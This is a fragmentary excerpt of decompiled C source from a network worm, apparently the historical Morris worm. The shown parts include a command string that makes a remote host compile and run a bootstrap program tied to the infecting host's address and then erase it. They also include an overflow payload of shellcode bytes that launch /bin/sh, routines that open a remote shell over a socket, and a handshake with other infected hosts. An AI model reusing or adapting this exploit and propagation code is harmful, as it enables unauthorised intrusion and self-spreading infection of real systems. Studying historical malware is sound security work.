...
#define COMPILE "cc -o x%d x%d.c;./x%d %s %d %d;rm -f x%d x%d.c;echo DONE\n"
  sprintf(send_buf, XS(COMPILE), l576, l576, l576, inet_ntoa(a2in(l592)), l580,
          l584, l576, l576);
  send_text(fdwr, send_buf);
    ...
    struct hst *host;
{
  ...
  for (i = 0; i < nobjects; i++) { /* 164,432 */
    ...
    sprintf(files[i], XS("x%d,%s"), (random() & 0x00ffffff), obj->name);
  ...
  for (i = 0; i < nobjects; i++) { /* 636,1040 */
    if ((l2612 = index(files[i], '.')) == NULL || l2612[1] != 'o')
      continue;
    ...
    struct hst host;
{
  ...
  sprintf(buf, XS("cc -o x%d x%d.c;x%d %s %d %d;rm -f x%d x%d.c\n"), key, key,
          key, inet_ntoa(a2in(arg16, arg20, arg24, key, key)->baz));
...
{ alarmed = 1; }
static x488e(fd, buf, num_chars, maxtime) int fd, num_chars, maxtime;
char *buf;
{
  int i, l8, readfds;
...
int *fd1, *fd2;
{
  ...
  for (i = 0; i < 400; i++)
    buf[i] = 1;
  for (j = 0; j < 28; j++)
    buf[i + j] = "\335\217/sh\0\335\217/"
                 "bin\320^Z\335\0\335\0\335Z\335\003\320^\\\274;"
                 "\344\371\344\342\241\256\343\350\357\256\362\351"[j];
 ...
 */
static int x538e(host, name1, name2) struct hst *host;
char *name1, *name2;
{
  int s, i;
  struct sockaddr_in sin; /* 16 bytes */
  ...
  if (write(s, XS(""), 1) == 1) {
    ...
    if ((write(s, XS("/bin/sh"), strlen(XS("/bin/sh")) + 1) >= 0) &&
        xread(s, in_buf, 1, 20) == 1 && in_buf[0] == '\0' &&
...
*/
object *getobjectbyname(name) char *name;
{
  int i;
...
static answer_other() /* 0x5b14 */
    int ns,
    addrlen, magic_holder, magic1, magic2;
struct sockaddr_in sin; /* 16 bytes */
addrlen = sizeof(sin);
...
if (xread(ns, &magic_holder, sizeof(magic_holder), 10) !=
    sizeof(magic_holder)) {
  close(ns);
  return;
}
